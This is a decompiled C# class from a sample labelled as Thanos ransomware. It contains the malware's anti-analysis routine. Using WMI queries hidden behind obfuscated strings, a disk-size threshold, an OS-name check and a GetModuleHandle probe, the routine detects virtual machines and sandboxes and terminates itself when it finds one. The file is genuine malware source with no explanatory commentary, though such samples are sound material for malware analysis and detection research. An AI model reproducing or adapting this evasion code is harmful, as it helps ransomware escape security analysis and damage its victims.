// Decompiled with JetBrains decompiler
// Type: frgoWklvEOSV.SXJylLGRkSghP
// Assembly: chaddad, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6BDE87D8-B0AC-468F-B40C-8A894553F651
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.07-msil\HEUR-Trojan-Ransom.MSIL.Thanos.gen-66ed5384220ff3091903e14a54849f824fdd13ac70dc4e0127eb59c1de801fc2.exe

using Microsoft.VisualBasic.Devices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;

namespace frgoWklvEOSV
{
  internal sealed class SXJylLGRkSghP
  {
    [NonSerialized]
    internal static GetString \u0011;

    public static void AfvdtDeOuqUqWT()
    {
      if (SXJylLGRkSghP.jeNVzYHbQf() || SXJylLGRkSghP.uwPVrcVobWimW() || SXJylLGRkSghP.LiMBvErHaWG() || SXJylLGRkSghP.PcGjaEFrQtsdx())
        Process.GetCurrentProcess().Kill();
      Environment.FailFast((string) null);
    }

    private static bool LiMBvErHaWG()
    {
      try
      {
        long num = 61000000000;
        if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= num)
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool PcGjaEFrQtsdx()
    {
      try
      {
        if (new ComputerInfo().OSFullName.ToLower().Contains(SXJylLGRkSghP.\u0011(107403032)))
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool jeNVzYHbQf()
    {
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(SXJylLGRkSghP.\u0011(107403027)))
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            foreach (ManagementBaseObject managementBaseObject in objectCollection)
            {
              string lower = managementBaseObject[SXJylLGRkSghP.\u0011(107403010)].ToString().ToLower();
              if (lower == SXJylLGRkSghP.\u0011(107402961) && managementBaseObject[SXJylLGRkSghP.\u0011(107402932)].ToString().ToUpperInvariant().Contains(SXJylLGRkSghP.\u0011(107402955)) || lower.Contains(SXJylLGRkSghP.\u0011(107402942)) || managementBaseObject[SXJylLGRkSghP.\u0011(107402932)].ToString() == SXJylLGRkSghP.\u0011(107402901))
                return true;
            }
          }
        }
      }
      catch
      {
      }
      return false;
    }

    private static bool uwPVrcVobWimW()
    {
      try
      {
        return SXJylLGRkSghP.GDuxaPadSRip(SXJylLGRkSghP.\u0011(107402916)).ToInt32() != 0;
      }
      catch
      {
        return false;
      }
    }

    [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle")]
    public static extern IntPtr GDuxaPadSRip([In] string obj0);

    static SXJylLGRkSghP() => Strings.CreateGetStringDelegate(typeof (SXJylLGRkSghP));
  }
}
